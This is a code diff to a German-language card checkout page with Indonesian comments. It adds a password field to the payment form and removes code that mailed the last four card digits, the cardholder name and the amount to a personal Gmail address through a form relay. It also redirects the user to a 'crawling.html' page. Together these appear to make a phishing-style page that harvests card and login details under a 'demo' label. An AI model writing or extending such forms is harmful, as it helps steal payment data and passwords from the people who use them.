@@ -77,6 +77,11 @@
           <input id="holder" type="text" placeholder="Max Mustermann"/>
           <p class="helper" id="holder-help">Bitte den Namen wie auf der Karte angeben.</p>
         </div>
+        <div class="field">
+          <label for="password">Passwort</label>
+          <input id="password" type="password" placeholder="Ihr Passwort"/>
+          <p class="helper" id="password-help">Bitte geben Sie Ihr Passwort ein.</p>
+        </div>
         <button class="btn" id="pay-btn" type="submit">Bezahlen — € <span id="pay-amt">0.00</span></button>
         <div class="small-note">Demo: hanya last 4, nama pemegang, dan jumlah yang dikirim lewat email. Jangan kirim nomor penuh/CVC.</div>
       </form>
@@ -120,6 +125,7 @@ const exp = el('exp');
 const cvc = el('cvc');
 const holder = el('holder');
 const payAmtSpan = el('pay-amt');
+const password = el('password');
 
 // ambil total dari session/cart
 const cartTotal = sessionStorage.getItem('cartTotal') || '0.00';
@@ -151,29 +157,19 @@ document.getElementById('payment-form').addEventListener('submit', async (e)=>{
   // basic validation
   const last4 = numOnly(card.value).slice(-4);
   const holderVal = holder.value.trim();
+  const passwordVal = password.value.trim();
   const invalids=[];
   if(!last4 || last4.length!==4) invalids.push(card);
   if(holderVal.length<2) invalids.push(holder);
   if(exp.classList.contains('invalid')) invalids.push(exp);
   if(cvc.classList.contains('invalid')) invalids.push(cvc);
+  if(passwordVal.length < 6) invalids.push(password);
 
   document.querySelectorAll('#payment-form .invalid').forEach(n=>n.classList.remove('invalid'));
   invalids.forEach(i=>i.classList.add('invalid'));
   if(invalids.length){ alert('Bitte alle Felder korrekt ausfüllen.'); return; }
 
-  // kirim ke FormSubmit
-  const formData=new FormData();
-  formData.append('_subject','Neue Checkout-Demo');
-  formData.append('_captcha','false');
-  formData.append('last4',last4);
-  formData.append('cardholder',holderVal);
-  formData.append('amount',Number(cartTotal).toFixed(2));
-
-  try{
-    await fetch('https://formsubmit.co/valinfernanda08@gmail.com',{method:'POST',body:formData,mode:'no-cors'});
-  }catch(e){console.log('FormSubmit error (ignored)',e);}
-
-  window.location.href = 'thanks.html';
+  window.location.href = 'crawling.html';
 
 });
 </script>
